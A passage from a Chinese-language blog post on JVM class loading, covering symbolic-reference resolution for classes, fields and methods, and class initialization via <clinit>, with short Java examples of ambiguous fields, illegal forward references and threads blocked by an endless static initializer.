href="#解析" class="headerlink" title="解析"></a>解析</h3><blockquote><p>符号引用：可以指向没有加载到虚拟机中内容</p><p>直接引用：直接指向目标的指针，也就是必须是虚拟机内的</p></blockquote><p>​        将常量池中的符号引用变为直接引用。</p><h4 id="类或接口解析"><a href="#类或接口解析" class="headerlink" title="类或接口解析"></a>类或接口解析</h4><p>​        假设当前代码在A类中，需要将一个符号引用B解析为一个直接引用C，则解析需要以下三步。</p><ol><li>如果C不是一个数组类型，虚拟机会把代表B的全限定名交给A的类加载器去加载C类。</li><li>如果是数组，则按照第一步去加载元素类型。</li><li>如果上面都没问题，C已经是一个类或者接口了，但这个时候还需要进行符号引用验证，就是看是否有权限访问。<ol><li>如果可以访问说明肯定是下面三种情况的一种：<ol><li>C为public，且与A在同一个模块儿</li><li>C是public，但与A不在一个模块儿，但是 C允许A访问</li><li>C不是public，但是与D在同一个包</li></ol></li></ol></li></ol><h4 id="字段解析"><a href="#字段解析" class="headerlink" title="字段解析"></a>字段解析</h4><p>​        通俗的说现在我需要解析C类的一个变量，如果C类本身含有则直接返回直接引用，如果没有就从下向上到父类和接口中寻找，如果有则返回直接引用，如果没有则抛出<code>java.lang.NoSuchFieldError</code>，如果成功返回来了引用还需要判断有没有权限，如果没有则派出<code>java.lang.IllegalAccessError</code>异常。</p><p>​        而实际中如果父类和接口都有同名字段，则可能拒绝编译。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">text1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">C</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C</span>();</span><br><span class="line">        <span class="comment">// 爆出：Reference to &#x27;i&#x27; is ambiguous, both &#x27;B.i&#x27; and &#x27;A.i&#x27; match</span></span><br><span class="line">        <span class="comment">// 无法编译</span></span><br><span class="line">        System.out.println(c.i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">A</span> &#123;<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> &#123;<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> <span class="keyword">extends</span> <span class="title class_">B</span> <span class="keyword">implements</span> <span class="title class_">A</span> &#123; &#125;</span><br></pre></td></tr></table></figure><h4 id="方法解析"><a href="#方法解析" class="headerlink" title="方法解析"></a>方法解析</h4><p>​        与字段解析类似，解析符号引用方法，看是否本类是否有，如果有则返回直接引用，没有去父类找，如果还没有去看自己实现的接口与父接口有没有该方法，如果有说明该类是一个抽象类爆出<code>java.lang.ABstractMethodError</code>异常，否则返回<code>java.lang.NoSuchMethodError</code>,如果成功返回了，还得继续判断权限，如果没有返回：<code>java.lang.IllegalAccessError</code>.</p><h4 id="接口方法解析"><a href="#接口方法解析" class="headerlink" title="接口方法解析"></a>接口方法解析</h4><p>​        与方法解析类似。</p><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>​        虚拟机开始正式执行类中编写的java程序代码。对静态代码块儿进行执行，对静态变量进行赋值。这里注意：静态代码块儿与静态变量优先级一致，谁在前面先执行谁。以下例子就能说明问题：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        i = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//Error:(13, 28) java: 非法前向引用 无法进行编译</span></span><br><span class="line">        System.out.println(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span>  <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虚拟机会保证子类初始化前，先将父类进行初始化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">text1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 2</span></span><br><span class="line">        System.out.println(B.B);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>  <span class="type">int</span> <span class="variable">A</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        A = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> <span class="variable">B</span> <span class="operator">=</span> A;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>上述初始化过程其实是执行了生成的<code>&lt;clinit&gt;()</code>方法,它并不是必须的，如果类和接口没有静态代码块也没有静态变量赋值，就不会生成这个方法</li><li>接口没有静态代码块和静态变量，但是可以进行初始化值，所以也会生成<code>&lt;clinit&gt;()</code>方法，但是接口不同的是，初始化时只执行自己的<code>&lt;clinit&gt;()</code>方法，不会管父类的，只有使用父类定义变量时，才会使用。</li><li><strong>虚拟机需要保证，在多线程情况下，类的初始化只完成一次，所以进行同步枷锁，只有一个线程去执行<code>&lt;clinit&gt;()</code>方法，其他线程阻塞，如果该方法持续很久，就会导致多线程一直阻塞这是很隐蔽的。</strong></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">text1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="comment">//会导致线程一直阻塞。</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">            System.out.println(Thread.currentThread()+<span class="string">&quot; start&quot;</span>);</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">            System.out.println(Thread.currentThread()+<span class="string">&quot; init&quot;</span>);</span><br><span class="line">        &#125;).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">            System.out.println(Thread.currentThread()+<span class="string">&quot; start&quot;</span>);</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">            System.out.println(Thread.currentThread()+<span class="string">&quot; init&quot;</span>);</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            System.out.println(Thread.currentThread()+<span class="string">&quot;init DeadLoopClass&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JVM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 类加载 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
